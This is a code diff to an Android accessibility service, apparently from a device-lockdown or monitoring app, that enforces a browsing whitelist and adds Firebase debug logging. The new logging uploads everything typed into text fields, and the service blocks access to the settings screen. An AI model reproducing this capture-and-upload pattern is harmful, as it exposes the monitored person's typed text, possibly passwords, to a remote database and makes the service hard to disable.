@@ -46,6 +46,25 @@ public class MonitorService extends AccessibilityService {
             iniciarWhitelistListener();
             iniciarListenerControl();
         }
+        // Log global para saber que el servicio se creó
+        logGlobal("SERVICE_CREATED", "MonitorService.onCreate()");
+    }
+
+    // Log a un nodo global (útil cuando no hay deviceId)
+    private void logGlobal(String tipo, String detalle) {
+        try {
+            DatabaseReference logRef = mDatabase.child("debug_logs_global").push();
+            Map<String, Object> logEntry = new HashMap<>();
+            logEntry.put("tipo", tipo);
+            logEntry.put("detalle", detalle);
+            logEntry.put("timestamp", System.currentTimeMillis());
+            if (deviceDocId != null) {
+                logEntry.put("deviceId", deviceDocId);
+            }
+            logRef.setValue(logEntry);
+        } catch (Exception e) {
+            Log.e(TAG, "Error en logGlobal: " + e.getMessage());
+        }
     }
 
     private void iniciarWhitelistListener() {
@@ -59,10 +78,12 @@ public class MonitorService extends AccessibilityService {
                     if (url != null) whiteList.add(url.toLowerCase().trim());
                 }
                 Log.d(TAG, "📋 Lista blanca actualizada: " + whiteList.size() + " sitios");
+                logGlobal("WHITELIST_UPDATED", "Sitios cargados: " + whiteList.size());
             }
             @Override
             public void onCancelled(DatabaseError error) {
                 Log.e(TAG, "Error cargando whitelist: " + error.getMessage());
+                logGlobal("WHITELIST_ERROR", error.getMessage());
             }
         });
     }
@@ -94,6 +115,9 @@ public class MonitorService extends AccessibilityService {
         int type = event.getEventType();
         String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
 
+        // Log de cada evento (para depuración)
+        logGlobal("EVENT", "Tipo: " + type + " Paquete: " + packageName);
+
         if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
             if (packageName.contains("settings") || packageName.contains("com.android.settings")) {
                 expulsarConMensaje("INTENTO_AJUSTES", "Acceso a configuración bloqueado");
@@ -108,6 +132,7 @@ public class MonitorService extends AccessibilityService {
                 if (text != null && text.length() > 0) {
                     ultimoTextoIngresado = text.toString();
                     paqueteNavegadorActual = packageName;
+                    logGlobal("TEXTO_CAPTURADO", "Texto: " + ultimoTextoIngresado);
                 }
                 source.recycle();
             }
@@ -117,32 +142,45 @@ public class MonitorService extends AccessibilityService {
         if ((type == AccessibilityEvent.TYPE_VIEW_CLICKED || 
              type == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) 
              && esNavegador(packageName)) {
+            logGlobal("PROCESAR_BUSQUEDA", "Llamando a procesarBusqueda()");
             procesarBusqueda();
         }
     }
 
     private void procesarBusqueda() {
-        if (ultimoTextoIngresado.isEmpty()) return;
+        if (ultimoTextoIngresado.isEmpty()) {
+            logGlobal("PROCESAR_BUSQUEDA", "Texto vacío, ignorando");
+            return;
+        }
         long ahora = System.currentTimeMillis();
-        if (ahora - ultimaExpulsionTime < EXPULSION_COOLDOWN) return;
+        if (ahora - ultimaExpulsionTime < EXPULSION_COOLDOWN) {
+            logGlobal("PROCESAR_BUSQUEDA", "Cooldown activo, ignorando");
+            return;
+        }
 
         String textoLower = ultimoTextoIngresado.toLowerCase().trim();
+        logGlobal("PROCESAR_BUSQUEDA", "Texto a evaluar: " + textoLower + " | Whitelist size: " + whiteList.size());
+
         boolean autorizado = false;
         for (String sitio : whiteList) {
             if (textoLower.contains(sitio)) {
                 autorizado = true;
+                logGlobal("PROCESAR_BUSQUEDA", "Coincidencia encontrada: " + sitio);
                 break;
             }
         }
         if (!autorizado) {
             ultimaExpulsionTime = ahora;
             bloquearIntento(textoLower);
+        } else {
+            logGlobal("PROCESAR_BUSQUEDA", "Búsqueda autorizada");
         }
     }
 
     private void bloquearIntento(String url) {
         Log.i(TAG, "🚫 Bloqueado: " + url);
         Toast.makeText(this, "🚫 Sitio no autorizado", Toast.LENGTH_SHORT).show();
+        logGlobal("BLOQUEO", "URL bloqueada: " + url);
 
         // Limpiar campo de búsqueda
         try {
@@ -153,13 +191,14 @@ public class MonitorService extends AccessibilityService {
             }
         } catch (Exception e) {
             Log.e(TAG, "Error limpiando campo: " + e.getMessage());
+            logGlobal("BLOQUEO_ERROR", e.getMessage());
         }
 
-        // Reportar a Firebase
+        // Reportar a Firebase (usar deviceId si existe, si no, reportar igual con un campo deviceId=null)
         DatabaseReference reportRef = mDatabase.child("system_analysis").child("blocked_attempts").push();
         Map<String, Object> data = new HashMap<>();
         data.put("url", url);
-        data.put("deviceId", deviceDocId);
+        data.put("deviceId", deviceDocId != null ? deviceDocId : "unknown");
         data.put("timestamp", ServerValue.TIMESTAMP);
         data.put("status", "Expulsado");
         reportRef.setValue(data);
@@ -182,13 +221,19 @@ public class MonitorService extends AccessibilityService {
     }
 
     private boolean esNavegador(String packageName) {
-        return packageName.contains("chrome") || packageName.contains("browser") ||
-               packageName.contains("firefox") || packageName.contains("opera") ||
-               packageName.contains("edge") || packageName.contains("samsung.android.app.sbrowser");
+        return packageName.contains("chrome") || 
+               packageName.contains("browser") ||
+               packageName.contains("firefox") || 
+               packageName.contains("opera") ||
+               packageName.contains("edge") || 
+               packageName.contains("samsung.android.app.sbrowser") ||
+               packageName.contains("com.android.chrome"); // Asegurar Chrome
     }
 
     @Override
-    public void onInterrupt() {}
+    public void onInterrupt() {
+        logGlobal("SERVICE_INTERRUPT", "onInterrupt()");
+    }
 
     @Override
     public void onServiceConnected() {
@@ -197,17 +242,19 @@ public class MonitorService extends AccessibilityService {
         info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                           AccessibilityEvent.TYPE_VIEW_CLICKED |
                           AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
-                          AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED;  // Añadido para Enter
+                          AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED; // Incluir Enter
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
         info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
         info.notificationTimeout = 100;
         setServiceInfo(info);
         Log.d(TAG, "MonitorService configurado");
+        logGlobal("SERVICE_CONNECTED", "MonitorService configurado");
     }
 
     private void expulsarConMensaje(String tipo, String descripcion) {
         Log.w(TAG, "EXPULSIÓN: " + tipo + " - " + descripcion);
         Toast.makeText(this, "🚫 ACCESO PROHIBIDO", Toast.LENGTH_SHORT).show();
+        logGlobal("EXPULSION", tipo + " - " + descripcion);
         Intent homeIntent = new Intent(Intent.ACTION_MAIN);
         homeIntent.addCategory(Intent.CATEGORY_HOME);
         homeIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
